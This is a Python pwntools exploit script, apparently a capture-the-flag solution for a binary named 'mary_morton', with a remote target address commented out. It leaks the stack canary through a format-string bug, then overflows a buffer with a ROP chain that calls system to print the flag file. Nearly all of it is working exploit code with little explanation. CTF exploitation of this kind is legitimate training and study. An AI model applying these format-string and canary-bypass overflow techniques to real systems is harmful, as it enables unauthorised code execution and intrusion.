from pwn import *
context.clear(arch='amd64')
r = process('./mary_morton')
#r = remote('146.185.132.36', 19153)
b = ELF('./mary_morton')
def recvInit():
    res = r.recvline()
    res += r.recvline()
    res += r.recvline()
    return res
def recvMenu():
    res = r.recvuntil('Exit the battle')
    res += r.recvline()
    return res
def bof(str):
    r.sendline('1')
    r.sendline(str)
    print r.recvline()
    print r.recvline()

def fmt(msg):
    r.sendline('2')
    r.sendline(msg)
    return r.recvline()

def q():
    r.sendline('3')
    r.close()

def getParameterToOurString():
    for i in range(1, 15):
        print i
        res = fmt("AAAA%{}$llx".format(i))
        recvMenu()
        print res
        if "41414141" in res:
            print "Found {}".format(res)
            return  i

#Leak Canary
print recvMenu()
offset_string = getParameterToOurString()
print "Found our string at offest {}".format(offset_string)
'''
Format string is at offset $rbp-0x90 so the canary is at 0x90-8 from our format string. Since we are reading 8 byte values we can calculate the correct offset of the canary from our string. Since we know our string offset we use the following to get the canary offset.
'''
fmt_str_offset_canary = offset_string + (0x90-8)/8
tmp = fmt("%{}$llu".format(fmt_str_offset_canary))
recvMenu()
canary =  int(tmp)
print "Found Canary: {}".format(hex(canary))

# do buffer overflow
cat_string = 0x400b2b #'/bin/cat flag' in memory
system = b.plt['system']
rop = ROP(b)
offset_to_canary = 0x90-8 #buffer overflow offset
payload = 'A'*offset_to_canary

rop.raw(canary)
rop.raw('A'*8) # overwrite rbp
rop.call('system', [cat_string])
print rop.dump()
payload += str(rop)
print payload
bof(payload)

r.interactive()

